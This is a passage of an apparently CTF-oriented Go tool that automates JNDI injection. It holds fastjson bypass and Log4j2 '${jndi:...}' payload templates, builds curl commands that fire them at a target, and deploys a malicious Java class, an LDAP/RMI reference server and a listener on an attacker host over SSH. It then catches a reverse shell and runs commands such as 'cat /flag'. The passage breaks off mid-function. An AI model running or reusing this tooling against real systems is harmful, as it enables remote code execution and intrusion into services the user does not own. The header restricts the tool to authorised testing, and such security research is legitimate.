// JNDI 注入一键利用（web.jndi）—— 普适版。对应 legacy/tools/web/jndi.py。
//
// 覆盖的触发面：fastjson 1.2.24/41/42/43/47 五种绕过模板、Log4j2 CVE-2021-44228
// （请求头 + POST body）、自定义模板（{{JNDI_URL}} / {{GADGET}} 占位符）。
// JNDI 引用协议：LDAP（默认）或 RMI（rmi_server.java，LDAP 被拦时用）。
//
// 与 Python 版的差异（架构迁移决策）：
//   - SSH 客户端由 PuTTY plink/pscp 改为原生 golang.org/x/crypto/ssh，
//     免去本机安装 PuTTY；putty_dir 参数保留但忽略（报告注明）。
//   - TOFU 主机密钥：首次连接记录 SHA256 指纹到数据目录
//     （jndi_ssh_hostkeys.json），此后连接校验指纹，变化即拒绝。
//   - 上传改用 `cat > path` 会话方式（免 pscp/sftp 依赖）。
//   - 远端命令序列、fifo 保活写法、pkill 正则字符类、JDK 模块回退等逐字保留。
//
// 仅用于授权 CTF / 安全测试环境。
package web

import (
	"bytes"
	"context"
	"embed"
	"encoding/base64"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"regexp"
	"strconv"
	"strings"
	"time"

	"crypto/tls"

	"golang.org/x/crypto/ssh"

	"ctfnet/internal/core"
)

//go:embed jndi_files
var jndiFilesFS embed.FS

const (
	jndiDefaultGadget      = "com.sun.rowset.JdbcRowSetImpl"
	jndiDefaultPuttyDir    = `D:\putty`
	jndiLog4jDefaultHeader = "X-Api-Version,User-Agent,X-Forwarded-For"
)

// 触发模板：{{JNDI_URL}} 与 {{GADGET}} 为占位符（与 Python POC_TEMPLATES 一致）。
var jndiPocTemplates = map[string]string{
	"fastjson_1.2.24": `{"@type": "{{GADGET}}", "dataSourceName": "{{JNDI_URL}}", "autoCommit": true}`,
	"fastjson_1.2.41": `{"@type": "L{{GADGET}};", "dataSourceName": "{{JNDI_URL}}", "autoCommit": true}`,
	"fastjson_1.2.42": `{"@type": "LL{{GADGET}};;", "dataSourceName": "{{JNDI_URL}}", "autoCommit": true}`,
	"fastjson_1.2.43": `{"@type": "[{{GADGET}}[{", "dataSourceName": "{{JNDI_URL}}", "autoCommit": true}`,
	"fastjson_1.2.47": `{"a": {"@type": "java.lang.Class", "val": "{{GADGET}}"}, "b": {"@type": "{{GADGET}}", "dataSourceName": "{{JNDI_URL}}", "autoCommit": true}}`,
	"log4j2":          `${jndi:{{JNDI_URL}}}`,
}

// 按 Python sorted(POC_TEMPLATES) 的顺序（触发模板错误提示用）。
var jndiTriggerKeys = []string{
	"fastjson_1.2.24", "fastjson_1.2.41", "fastjson_1.2.42",
	"fastjson_1.2.43", "fastjson_1.2.47", "log4j2",
}

// 可缩短的轮询间隔（测试覆盖用；默认值与 Python 一致）。
var (
	jndiWaitConnInterval   = 3 * time.Second
	jndiWaitListenInterval = 2 * time.Second
	// 盲发前确认监听器的等待上限（Python 硬编码 10s）。
	jndiBlindWaitListenTimeout = 10 * time.Second
	// POST 前确认监听器的等待上限（Python 硬编码 30s）。
	jndiPostWaitListenTimeout = 30 * time.Second
)

var (
	jndiListenerLogRe = regexp.MustCompile(`^(Listening on |Rejected connection|Accepted connection|Connection closed)`)
	jndiPidRe         = regexp.MustCompile(`pid=(\d+)`)
	jndiFlagRe        = regexp.MustCompile(`flag\{[^}]+\}`)
)

func init() {
	tool := &jndiTool{}
	tool.BaseTool = core.BaseTool{
		NameAttr:     "jndi",
		CategoryAttr: core.CatWeb,
		VersionAttr:  "1.0.0",
		TimeoutAttr:  300,
		DescriptionAttr: "JNDI 注入一键利用：SSH 自动在远程服务器部署 LDAP 引用服务与恶意类，" +
			"生成 fastjson 1.2.47 PoC，监听端口捕获反弹 shell 并执行命令。" +
			"适用 JDK<8u191（LDAP 远程类加载默认可用）；内置原生 Go SSH，无需本机安装 PuTTY。",
		ParamsAttr: jndiParams(),
		Runner:     tool.run,
	}
	core.DefaultRegistry.Register(tool)
}

func jndiParams() []core.ParamSpec {
	return []core.ParamSpec{
		{Name: "ssh_host", Type: "str", Required: false, Default: "", Description: "攻击服务器 IP/域名（部署 JNDI 环境与监听）；可在「设置」页配置默认值"},
		{Name: "ssh_port", Type: "int", Required: false, Default: 22, Description: "SSH 端口"},
		{Name: "ssh_user", Type: "str", Required: false, Default: "", Description: "SSH 用户名；可在「设置」页配置默认值"},
		{Name: "ssh_pass", Type: "password", Required: false, Default: "", Description: "SSH 密码（前端以掩码输入框渲染）；可在「设置」页配置默认值"},
		{Name: "putty_dir", Type: "str", Required: false, Default: jndiDefaultPuttyDir, Description: "PuTTY 目录（已改用内置 Go SSH，此参数忽略保留兼容）"},
		{Name: "lhost", Type: "str", Required: false, Default: "", Description: "靶机可访问的回连公网 IP，默认取 ssh_host"},
		{Name: "ldap_port", Type: "int", Required: false, Default: 1389, Description: "LDAP 引用服务端口（jndi_protocol=ldap 时生效）"},
		{Name: "jndi_protocol", Type: "str", Required: false, Default: "ldap", Description: "JNDI 引用协议: ldap | rmi（LDAP 被拦/不支持时用 RMI）"},
		{Name: "rmi_port", Type: "int", Required: false, Default: 1099, Description: "RMI 注册表端口（jndi_protocol=rmi 时生效）"},
		{Name: "http_port", Type: "int", Required: false, Default: 8888, Description: "恶意类 HTTP 下载端口"},
		{Name: "lport", Type: "int", Required: false, Default: 31339, Description: "反弹 shell 监听端口"},
		{Name: "target_url", Type: "str", Required: false, Default: "", Description: "靶机漏洞端点（如 http://靶机/login），留空则不自动发送 PoC"},
		{Name: "trigger", Type: "str", Required: false, Default: "fastjson_1.2.47", Description: "触发模板: fastjson_1.2.24/1.2.41/1.2.42/1.2.43/1.2.47 | log4j2 | custom"},
		{Name: "custom_template", Type: "text", Required: false, Default: "", Description: "trigger=custom 时使用，占位符 {{JNDI_URL}} {{GADGET}}"},
		{Name: "log4j_header", Type: "str", Required: false, Default: jndiLog4jDefaultHeader, Description: "log4j2 触发时注入的请求头（逗号分隔，payload 同时放入 POST body）"},
		{Name: "command", Type: "str", Required: false, Default: "cat /flag", Description: "拿到 shell 后执行的命令"},
		{Name: "interactive", Type: "bool", Required: false, Default: true, Description: "成功反弹后保持交互会话（前端可继续下发命令，关闭会话时自动清理远程环境）"},
		{Name: "gadget_class", Type: "str", Required: false, Default: jndiDefaultGadget, Description: "JNDI 触发链类"},
		{Name: "wait_time", Type: "int", Required: false, Default: 60, Description: "等待反弹连接超时（秒）"},
		{Name: "shell", Type: "str", Required: false, Default: "/bin/sh", Description: "反弹 shell 进程路径（靶机容器可能没有 bash，默认 /bin/sh）"},
		{Name: "cleanup", Type: "bool", Required: false, Default: true, Description: "结束后清理远程进程与工作目录（交互会话由前端「关闭会话」按钮清理）"},
	}
}

// jndiTool JNDI 注入一键利用工具。
type jndiTool struct {
	core.BaseTool
}

func (t *jndiTool) ValidateParams(params map[string]any) (map[string]any, error) {
	return t.BaseTool.ValidateParams(params)
}

// ---------------------------------------------------------------------------
// 参数提取辅助（等价 Python `params.get(key) or default` / bool() 语义）
// ---------------------------------------------------------------------------

func jndiBool(p map[string]any, key string, def bool) bool {
	switch v := p[key].(type) {
	case bool:
		return v
	case float64:
		return v != 0
	case int:
		return v != 0
	case string:
		return v != "" && v != "false" && v != "0"
	}
	return def
}

func jndiStrOr(p map[string]any, key, def string) string {
	if v := strings.TrimSpace(paramStr(p, key)); v != "" {
		return v
	}
	return def
}

func jndiIntOr(p map[string]any, key string, def int) int {
	if v := j2Int(p, key); v != 0 {
		return v
	}
	return def
}

// truncRunes 对应 Python s[:n]：按码点截断。
func truncRunes(s string, n int) string {
	r := []rune(s)
	if len(r) <= n {
		return s
	}
	return string(r[:n])
}

// jndiJSONPretty 对应 Python json.dumps(v, indent=2, ensure_ascii=False)。
func jndiJSONPretty(v any) string {
	var buf bytes.Buffer
	enc := json.NewEncoder(&buf)
	enc.SetEscapeHTML(false)
	enc.SetIndent("", "  ")
	_ = enc.Encode(v)
	return strings.TrimSuffix(buf.String(), "\n")
}

func jndiRandomClassName() string {
	// 随机化恶意类名：目标 JVM 对同名类只加载一次（静态块不重复执行），
	// 每次运行使用新类名才能再次触发。
	const cs = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, 8)
	for i := range b {
		b[i] = cs[rand.Intn(len(cs))]
	}
	return "Exploit" + string(b)
}

func copyStrMap(m map[string]string) map[string]string {
	out := make(map[string]string, len(m))
	for k, v := range m {
		out[k] = v
	}
	return out
}

// ---------------------------------------------------------------------------
// TOFU 主机密钥存储（等价 plink 的首次信任 + -hostkey 固定）
// ---------------------------------------------------------------------------

type jndiHostKeyStore struct {
	path  string
	hosts map[string]string // "host:port" -> "SHA256:..."
}

func loadJndiHostKeys(path string) map[string]string {
	hosts := map[string]string{}
	data, err := os.ReadFile(path)
	if err != nil {
		return hosts
	}
	_ = json.Unmarshal(data, &hosts)
	return hosts
}

func saveJndiHostKeys(path string, hosts map[string]string) {
	data, err := json.MarshalIndent(hosts, "", "  ")
	if err != nil {
		return
	}
	_ = os.WriteFile(path, data, 0o600)
}

// jndiTOFUPath 数据目录下的主机密钥存储路径（data/jndi_ssh_hostkeys.json）。
// ToolContext.Workdir 为 data/work/{jobId}，上溯两级即 data/。
func jndiTOFUPath(tc *core.ToolContext) string {
	if tc != nil && tc.Workdir != "" {
		dataDir := filepath.Dir(filepath.Dir(tc.Workdir))
		if dataDir != "" && dataDir != "." {
			return filepath.Join(dataDir, "jndi_ssh_hostkeys.json")
		}
	}
	return filepath.Join(os.TempDir(), "ctf-net-jndi-hostkeys.json")
}

// ---------------------------------------------------------------------------
// SSH 客户端（原生 x/crypto/ssh，替代 PlinkClient）
// ---------------------------------------------------------------------------

// jndiExecer 抽象 SSH 执行（真实客户端与测试假件共用）。
type jndiExecer interface {
	exec(ctx context.Context, cmd string, timeout time.Duration) (int, string, string)
	putText(ctx context.Context, content []byte, remotePath string, timeout time.Duration) (int, string)
}

// jndiSSHClient 原生 SSH 客户端：每次 exec 新建连接（等价 plink 进程模型），
// 公网瞬断自动重试（×5、退避 2*attempt 秒），认证/主机密钥错误立即返回。
type jndiSSHClient struct {
	host     string
	port     int
	user     string
	password string
	store    *jndiHostKeyStore
}

// 对应 Python _TRANSIENT_HINTS（plink 报错串）+ Go 网络错误等价文本。
// Windows 的 WSAE* 瞬断报错串一并收录（RST=forcibly closed、ABORTED=connection was aborted）。
var jndiTransientHints = []string{
	"network error", "connection abort", "connection was aborted",
	"connection refused", "connection timed out", "connection reset",
	"forcibly closed", "broken pipe", "i/o timeout", "eof",
}

func jndiTransientErr(errS string) bool {
	l := strings.ToLower(errS)
	for _, h := range jndiTransientHints {
		if strings.Contains(l, h) {
			return true
		}
	}
	return false
}

func (c *jndiSSHClient) hostKeyCallback() ssh.HostKeyCallback {
	return func(hostname string, remote net.Addr, key ssh.PublicKey) error {
		fp := ssh.FingerprintSHA256(key)
		addr := remote.String()
		if stored, ok := c.store.hosts[addr]; ok {
			if stored != fp {
				return fmt.Errorf("主机密钥不匹配（实际 %s，已记录 %s），如确认服务器重装请删除 %s 后重试", fp, stored, c.store.path)
			}
			return nil
		}
		c.store.hosts[addr] = fp
		saveJndiHostKeys(c.store.path, c.store.hosts)
		return nil
	}
}

// runSession 单次连接执行远程命令（可选 stdin 上传），返回 (exit_code, stdout, stderr)。
func (c *jndiSSHClient) runSession(ctx context.Context, cmd string, stdin []byte, timeout time.Duration) (int, string, string) {
	dctx, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	config := &ssh.ClientConfig{
		User:            c.user,
		Auth:            []ssh.AuthMethod{ssh.Password(c.password)},
		HostKeyCallback: c.hostKeyCallback(),
		Timeout:         timeout,
	}
	conn, err := ssh.Dial("tcp", net.JoinHostPort(c.host, strconv.Itoa(c.port)), config)
	if err != nil {
		return -1, "", err.Error()
	}
	defer conn.Close()
	sess, err := conn.NewSession()
	if err != nil {
		return -1, "", err.Error()
	}
	defer sess.Close()
	var outB, errB bytes.Buffer
	sess.Stdout, sess.Stderr = &outB, &errB
	if stdin != nil {
		sess.Stdin = bytes.NewReader(stdin)
	}
	// 看门狗：超时强制关会话（对应 Python asyncio.wait_for + proc.kill）
	done := make(chan struct{})
	go func() {
		select {
		case <-dctx.Done():
			sess.Close()
		case <-done:
		}
	}()
	runErr := sess.Run(cmd)
	close(done)
	out, errS := outB.String(), errB.String()
	if runErr == nil {
		return 0, out, errS
	}
	if ee, ok := runErr.(*ssh.ExitError); ok {
		code := ee.ExitStatus()
		if code < 0 { // 被信号杀死
			return 1, out, errS
		}
		return code, out, errS
	}
	if dctx.Err() != nil {
		return -1, out, fmt.Sprintf("执行超时（>%ds）", int(timeout/time.Second))
	}
	return -1, out, errS + runErr.Error()
}

// exec 远程执行命令（瞬态错误重试 ×5）。
func (c *jndiSSHClient) exec(ctx context.Context, cmd string, timeout time.Duration) (int, string, string) {
	for attempt := 1; attempt <= 5; attempt++ {
		code, out, errS := c.runSession(ctx, cmd, nil, timeout)
		if code == 0 {
			return code, out, errS
		}
		if strings.Contains(errS, "执行超时") {
			return code, out, errS
		}
		if attempt < 5 && jndiTransientErr(errS) {
			select {
			case <-time.After(time.Duration(2*attempt) * time.Second):
			case <-ctx.Done():
				return code, out, errS
			}
			continue
		}
		return code, out, errS
	}
	return -1, "", "" // pragma: no cover
}

// putText 上传文本文件（`cat > path`，免 pscp/sftp 依赖）。
func (c *jndiSSHClient) putText(ctx context.Context, content []byte, remotePath string, timeout time.Duration) (int, string) {
	lastCode, lastMsg := -1, ""
	for attempt := 1; attempt <= 5; attempt++ {
		code, out, errS := c.runSession(ctx, fmt.Sprintf("cat > '%s'", remotePath), content, timeout)
		if code == 0 {
			return 0, ""
		}
		lastCode, lastMsg = code, strings.TrimSpace(out+errS)
		if strings.Contains(errS, "执行超时") {
			return lastCode, lastMsg
		}
		if attempt < 5 && jndiTransientErr(errS) {
			select {
			case <-time.After(time.Duration(2*attempt) * time.Second):
			case <-ctx.Done():
				return lastCode, lastMsg
			}
			continue
		}
		return lastCode, lastMsg
	}
	return lastCode, lastMsg
}

// ---------------------------------------------------------------------------
// HTTP POST / 外部可达性检查（对应 _post_json / _post_log4j / _check_external）
// ---------------------------------------------------------------------------

// jndiPostErrName 映射 Go 网络错误到 Python 异常类型名（报告保真用）。
func jndiPostErrName(err error) string {
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return "TimeoutError"
	}
	return "URLError"
}

// jndiPost 按 urllib 语义 POST：status>=400 视为异常（HTTPError），
// 网络错误返回 (0, "类型名: 消息", false)。容忍自签名证书。
func jndiPost(urlStr, payload string, headers map[string]string, contentType string, timeout time.Duration) (int, string, bool) {
	client := &http.Client{
		Timeout: timeout,
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // CERT_NONE
		},
	}
	req, err := http.NewRequest(http.MethodPost, urlStr, strings.NewReader(payload))
	if err != nil {
		return 0, fmt.Sprintf("ValueError: %v", err), false
	}
	req.Header.Set("Content-Type", contentType)
	for k, v := range headers {
		req.Header.Set(k, v)
	}
	resp, err := client.Do(req)
	if err != nil {
		name := jndiPostErrName(err)
		if name == "TimeoutError" {
			return 0, "TimeoutError: timed out", false
		}
		return 0, fmt.Sprintf("URLError: <urlopen error %v>", err), false
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(io.LimitReader(resp.Body, 500))
	if resp.StatusCode >= 400 {
		return 0, fmt.Sprintf("HTTPError: HTTP Error %d: %s", resp.StatusCode, http.StatusText(resp.StatusCode)), false
	}
	return resp.StatusCode, string(body), true
}

// jndiSockErrName 映射 socket.create_connection 的异常类型名。
func jndiSockErrName(err error) string {
	var ne net.Error
	if errors.As(err, &ne) && ne.Timeout() {
		return "TimeoutError"
	}
	msg := strings.ToLower(err.Error())
	switch {
	case strings.Contains(msg, "refused"):
		return "ConnectionRefusedError"
	case strings.Contains(msg, "reset"):
		return "ConnectionResetError"
	}
	return "OSError"
}

// jndiCheckExternal 从本机直连公网服务器端口，验证云安全组/防火墙已放行入站。
func jndiCheckExternal(host string, ports []int, timeout time.Duration) map[int]string {
	result := map[int]string{}
	for _, port := range ports {
		conn, err := net.DialTimeout("tcp", net.JoinHostPort(host, strconv.Itoa(port)), timeout)
		if err == nil {
			conn.Close()
			result[port] = "OK"
			continue
		}
		result[port] = fmt.Sprintf("%s: %s", jndiSockErrName(err), err)
	}
	return result
}

// ---------------------------------------------------------------------------
// 反弹 shell 交互会话（对应 _InteractiveShell 的 fifo marker 增量输出协议）
// ---------------------------------------------------------------------------

// jndiShell 经 fifo 下发命令、增量读取输出：
// 每条命令后追加唯一 marker（echo MARKER$?），读到 marker 即认为执行完毕；
// 输出偏移按「解码后字符长度」在会话内累计（tail -c 按字节会错位）。
type jndiShell struct {
	client  jndiExecer
	workdir string
	pids    map[string]string
	note    func(string)
	refSvc  string
	lastLen int
	seq     int
}

// setup 建立基线：注册前 rev.out 已有内容不算新输出；并回收 HTTP/引用服务
// ——类已加载完毕，这两个一次性服务不再需要。
func (sh *jndiShell) setup(ctx context.Context) {
	_, out, _ := sh.client.exec(ctx, fmt.Sprintf("cat %s/rev.out 2>/dev/null", sh.workdir), 20*time.Second)
	sh.lastLen = pyLen(out)
	for _, name := range []string{"http", sh.refSvc} {
		if pid := sh.pids[name]; pid != "" {
			sh.client.exec(ctx, fmt.Sprintf("kill %s 2>/dev/null || true", pid), 20*time.Second)
		}
	}
}

// execCommand 下发命令，返回 (增量输出, 是否超时, 会话是否已断开)。
func (sh *jndiShell) execCommand(ctx context.Context, command string, timeout time.Duration) (string, bool, bool) {
	sh.seq++
	marker := fmt.Sprintf("__CTF_DONE_%d__", sh.seq)
	payload := fmt.Sprintf("%s\necho %s$?\n", command, marker)
	b64 := base64.StdEncoding.EncodeToString([]byte(payload))
	code, out, errS := sh.client.exec(ctx,
		fmt.Sprintf("echo %s | base64 -d >%s/rev.fifo", b64, sh.workdir), 30*time.Second)
	if code != 0 {
		// fifo 写入失败（无读者/SSH 超时）：shell 大概率已断开
		return fmt.Sprintf("[下发失败] %s", strings.TrimSpace(out+errS)), false, true
	}

	deadline := time.Now().Add(timeout)
	new := ""
	for time.Now().Before(deadline) {
		if ctx != nil && ctx.Err() != nil {
			break
		}
		code, out, _ := sh.client.exec(ctx,
			fmt.Sprintf("cat %s/rev.out 2>/dev/null", sh.workdir), 20*time.Second)
		if code == 0 {
			runes := []rune(out)
			if sh.lastLen < len(runes) {
				new = string(runes[sh.lastLen:])
			} else {
				new = ""
			}
			if strings.Contains(new, marker) {
				break
			}
		}
		time.Sleep(600 * time.Millisecond)
	}
	sh.lastLen += pyLen(new)
	timedOut := !strings.Contains(new, marker)
	closed := strings.Contains(new, "Connection closed")

	if strings.Contains(new, marker) {
		// 丢弃 marker 行及其后内容（可能混有监听器日志）
		var kept []string
		for _, ln := range strings.Split(new, "\n") {
			if strings.HasPrefix(ln, marker) {
				break
			}
			kept = append(kept, ln)
		}
		new = strings.Join(kept, "\n")
	}
	// 监听器自身日志不属于命令输出
	var lines []string
	for _, ln := range strings.Split(new, "\n") {
		if !jndiListenerLogRe.MatchString(ln) {
			lines = append(lines, ln)
		}
	}
	return strings.TrimRight(strings.Join(lines, "\n"), "\n"), timedOut, closed
}

// close 清理远程环境：杀监听器与 fifo 保活进程、删工作目录。
func (sh *jndiShell) close(ctx context.Context) {
	killTargets := strings.TrimSpace(strings.Join([]string{sh.pids["listener"], sh.pids["fifo"]}, " "))
	if killTargets != "" {
		sh.client.exec(ctx, fmt.Sprintf("kill %s 2>/dev/null || true", killTargets), 20*time.Second)
	}
	sh.client.exec(ctx,
		"pkill -f 'sleep 999[9]99' 2>/dev/null; "+
			"pkill -f 'reverse_listene[r]' 2>/dev/null || true", 20*time.Second)
	sh.client.exec(ctx, fmt.Sprintf("rm -rf %s", sh.workdir), 20*time.Second)
}

// ---------------------------------------------------------------------------
// 轮询 / 下发辅助（对应 _wait_connection / _wait_listen / _send_command / _read_output）
// ---------------------------------------------------------------------------

// jndiWaitConnection 轮询远程 ss/netstat 判断 lport 是否有 ESTABLISHED 连接。
func jndiWaitConnection(ctx context.Context, client jndiExecer, lport int, waitDur time.Duration) bool {
	deadline := time.Now().Add(waitDur)
	for time.Now().Before(deadline) {
		if ctx != nil && ctx.Err() != nil {
			return false
		}
		_, out, _ := client.exec(ctx,
			fmt.Sprintf("(ss -tn 2>/dev/null || netstat -tn 2>/dev/null) | grep -cE ':%d\\s' || true", lport),
			20*time.Second)
		if n, err := strconv.Atoi(strings.TrimSpace(out)); err == nil && n > 0 {
			return true
		}
		time.Sleep(jndiWaitConnInterval)
	}
	return false
}

// jndiWaitListen 轮询确认监听已进入 LISTEN，避免回连早于监听建立的竞态。
func jndiWaitListen(ctx context.Context, client jndiExecer, lport int, waitDur time.Duration) bool {
	deadline := time.Now().Add(waitDur)
	for time.Now().Before(deadline) {
		if ctx != nil && ctx.Err() != nil {
			return false
		}
		code, out, _ := client.exec(ctx,
			fmt.Sprintf("ss -tln 2>/dev/null | grep -cE ':%d\\s' || true", lport),
			20*time.Second)
		if code == 0 {
			if n, err := strconv.Atoi(strings.TrimSpace(out)); err == nil && n > 0 {
				return true
			}
		}
		time.Sleep(jndiWaitListenInterval)
	}
	return false
}

// jndiSendCommand 经 fifo 向反弹 shell 下发命令（base64 传递避免引号转义问题；
// 必须在末尾补换行符：shell 读到行结束符才会执行命令）。
func jndiSendCommand(ctx context.Context, client jndiExecer, workdir, command string) {
	b64 := base64.StdEncoding.EncodeToString([]byte(command + "\n"))
	client.exec(ctx, fmt.Sprintf("echo %s | base64 -d >%s/rev.fifo", b64, workdir), 30*time.Second)
}

func jndiReadOutput(ctx context.Context, client jndiExecer, workdir string) string {
	_, out, _ := client.exec(ctx, fmt.Sprintf("cat %s/rev.out 2>/dev/null", workdir), 30*time.Second)
	return out
}

// ---------------------------------------------------------------------------
// 主流程
// ---------------------------------------------------------------------------

// jndiParamsX 提取后的运行参数。
type jndiParamsX struct {
	sshHost, sshUser, sshPass, puttyDir, lhost string
	sshPort, ldapPort, rmiPort, httpPort       int
	lport                                      int
	jndiProtocol, targetURL, trigger           string
	customTemplate, log4jHeader, command       string
	gadget, shell                              string
	waitTime                                   int
	cleanup, interactive                       bool
	isRMI, isLog4j                             bool
	refPort                                    int
	clsName, codebase, jndiURL, workdir        string
}

func jndiRefSvcName(isRMI bool) string {
	if isRMI {
		return "rmi"
	}
	return "ldap"
}

// jndiBuildPoc 生成 PoC 与 curl 命令（对应主流程 [5] 的纯计算部分）。
func jndiBuildPoc(p jndiParamsX) (pocRaw, curlCmd string, poc map[string]any, headerNames []string, err error) {
	template := jndiPocTemplates[p.trigger]
	if p.trigger == "custom" {
		template = p.customTemplate
	}
	if template == "" {
		return "", "", nil, nil, fmt.Errorf("未知 trigger: %s（可选: %s 或 custom）",
			p.trigger, strings.Join(jndiTriggerKeys, ", "))
	}
	pocRaw = strings.ReplaceAll(strings.ReplaceAll(template, "{{JNDI_URL}}", p.jndiURL), "{{GADGET}}", p.gadget)
	poc = map[string]any{}
	if err := json.Unmarshal([]byte(pocRaw), &poc); err != nil {
		poc = map[string]any{"raw": pocRaw}
	}
	log4jHeaders := map[string]string{}
	for _, h := range strings.Split(p.log4jHeader, ",") {
		h = strings.TrimSpace(h)
		if h == "" {
			continue
		}
		headerNames = append(headerNames, h)
		log4jHeaders[h] = pocRaw
	}
	target := p.targetURL
	if target == "" {
		target = "<TARGET_URL>"
	}
	if p.isLog4j {
		var hdrArgs []string
		for _, h := range headerNames {
			hdrArgs = append(hdrArgs, fmt.Sprintf("-H '%s: %s'", h, pocRaw))
		}
		curlCmd = fmt.Sprintf("curl -s -X POST '%s' %s -d '%s'", target, strings.Join(hdrArgs, " "), pocRaw)
	} else {
		curlCmd = fmt.Sprintf("curl -s -X POST '%s' -H 'Content-Type: application/json' -d '%s'", target, pocRaw)
	}
	return pocRaw, curlCmd, poc, headerNames, nil
}

// jndiState 一次运行的可变状态（对应 Python run() 内的闭包变量）。
type jndiState struct {
	status      core.Status
	stderr      string
	log         []string
	pids        map[string]string
	shellOutput string
	connected   bool
	httpResp    map[string]any
	poc         map[string]any
	pocRaw      string
	curlCmd     string
	sessionID   string
	keepSession bool
	flag        string
}

// mainFlow 主流程 7 步（对应 Python run() 的 try 块）。返回错误等价 Python raise RuntimeError。
func (st *jndiState) mainFlow(ctx context.Context, tc *core.ToolContext, client jndiExecer, note func(string), p jndiParamsX) error {
	// [1] SSH 连接
	note(fmt.Sprintf("[1/7] SSH 连接 %s@%s:%d ...", p.sshUser, p.sshHost, p.sshPort))
	code, out, errS := client.exec(ctx, "echo OK", 30*time.Second)
	if code != 0 || !strings.Contains(out, "OK") {
		return fmt.Errorf("SSH 连接/认证失败: %s", truncRunes(strings.TrimSpace(out+errS), 300))
	}
	note("      连接成功")

	// [2] 环境与端口检查
	note("[2/7] 检查远程环境（javac/python3/base64）...")
	code, out, _ = client.exec(ctx,
		"for c in javac python3 base64; do command -v $c >/dev/null 2>&1 || echo MISSING:$c; done",
		60*time.Second)
	var missing []string
	for _, line := range strings.Split(out, "\n") {
		if strings.HasPrefix(line, "MISSING:") {
			missing = append(missing, strings.SplitN(line, ":", 2)[1])
		}
	}
	if len(missing) > 0 {
		return fmt.Errorf("远程服务器缺少依赖: %s（javac 可执行 apt install default-jdk）", strings.Join(missing, ", "))
	}
	code, out, _ = client.exec(ctx,
		fmt.Sprintf("ss -tln 2>/dev/null | grep -E ':(%d|%d|%d) ' || true", p.httpPort, p.refPort, p.lport),
		60*time.Second)
	if strings.TrimSpace(out) != "" {
		return fmt.Errorf("远程服务器端口已被占用:\n%s", strings.TrimSpace(out))
	}

	// [3] 部署模板并编译
	note(fmt.Sprintf("[3/7] 生成模板并部署到 %s ...", p.workdir))
	client.exec(ctx, fmt.Sprintf("mkdir -p %s", p.workdir), 60*time.Second)
	javaSrcB, _ := jndiFilesFS.ReadFile("jndi_files/Exploit.java")
	javaSrc := string(javaSrcB)
	javaSrc = strings.Replace(javaSrc, "class Exploit", "class "+p.clsName, 1)
	javaSrc = strings.ReplaceAll(javaSrc, "{{SHELL}}",
		strings.ReplaceAll(strings.ReplaceAll(p.shell, "\\", "\\\\"), `"`, `\"`))
	javaSrc = strings.ReplaceAll(javaSrc, "{{HOST}}", p.lhost)
	javaSrc = strings.ReplaceAll(javaSrc, "{{PORT}}", strconv.Itoa(p.lport))
	ldapSrcB, _ := jndiFilesFS.ReadFile("jndi_files/ldap_server.py")
	listenerSrcB, _ := jndiFilesFS.ReadFile("jndi_files/reverse_listener.py")
	// 本地留存副本（等价 Python 写入 ctx.workdir，便于事后检查）
	if tc != nil && tc.Workdir != "" {
		_ = os.MkdirAll(tc.Workdir, 0o755)
		_ = os.WriteFile(filepath.Join(tc.Workdir, p.clsName+".java"), []byte(javaSrc), 0o644)
		_ = os.WriteFile(filepath.Join(tc.Workdir, "ldap_server.py"), ldapSrcB, 0o644)
		_ = os.WriteFile(filepath.Join(tc.Workdir, "reverse_listener.py"), listenerSrcB, 0o644)
	}
	if code, msg := client.putText(ctx, []byte(javaSrc), fmt.Sprintf("%s/%s.java", p.workdir, p.clsName), 90*time.Second); code != 0 {
		return fmt.Errorf("上传 %s.java 失败: %s", p.clsName, msg)
	}
	if code, msg := client.putText(ctx, ldapSrcB, p.workdir+"/ldap_server.py", 90*time.Second); code != 0 {
		return fmt.Errorf("上传 ldap_server.py 失败: %s", msg)
	}
	if code, msg := client.putText(ctx, listenerSrcB, p.workdir+"/reverse_listener.py", 90*time.Second); code != 0 {
		return fmt.Errorf("上传 reverse_listener.py 失败: %s", msg)
	}
	javacBin := core.ToolPath("javac") // 远程主机上的 javac 命令/路径，可在设置页配置
	if p.isRMI {
		rmiSrcB, _ := jndiFilesFS.ReadFile("jndi_files/rmi_server.java")
		if tc != nil && tc.Workdir != "" {
			_ = os.WriteFile(filepath.Join(tc.Workdir, "rmi_server.java"), rmiSrcB, 0o644)
		}
		// public class 必须与文件名一致，远端统一用 RMIServer.java
		if code, msg := client.putText(ctx, rmiSrcB, p.workdir+"/RMIServer.java", 90*time.Second); code != 0 {
			return fmt.Errorf("上传 RMIServer.java 失败: %s", msg)
		}
		// com.sun.jndi.rmi.registry 随 JDK 版本搬家：JDK 17+ 在 jdk.naming.rmi
		// 模块（还需 --add-modules 拉入模块图）、JDK 9-16 在 java.naming、
		// JDK 8 无模块系统直接编译。逐级回退直到成功。
		compileCmds := []string{
			javacBin + " --add-modules jdk.naming.rmi " +
				"--add-exports jdk.naming.rmi/com.sun.jndi.rmi.registry=ALL-UNNAMED " +
				p.workdir + "/RMIServer.java 2>&1",
			javacBin + " --add-exports java.naming/com.sun.jndi.rmi.registry=ALL-UNNAMED " +
				p.workdir + "/RMIServer.java 2>&1",
			javacBin + " " + p.workdir + "/RMIServer.java 2>&1",
		}
		code, out, errS := -1, "", ""
		for _, ccmd := range compileCmds {
			code, out, errS = client.exec(ctx, ccmd, 60*time.Second)
			if code == 0 {
				break
			}
		}
		if code != 0 {
			return fmt.Errorf("RMIServer.java 编译失败:\n%s", truncRunes(strings.TrimSpace(out+errS), 500))
		}
	}
	// 靶机 JDK 常为 Java 8：优先 --release 8 产出 major 52 字节码；
	// 老版 javac（JDK 8 本身）无 --release 选项，报 invalid flag 时回退。
	code, out, errS = client.exec(ctx,
		fmt.Sprintf("cd %s && %s --release 8 %s.java 2>&1", p.workdir, javacBin, p.clsName), 60*time.Second)
	if code != 0 && strings.Contains(out+errS, "release") &&
		(strings.Contains(out+errS, "invalid flag") || strings.Contains(out+errS, "unrecognized")) {
		code, out, errS = client.exec(ctx,
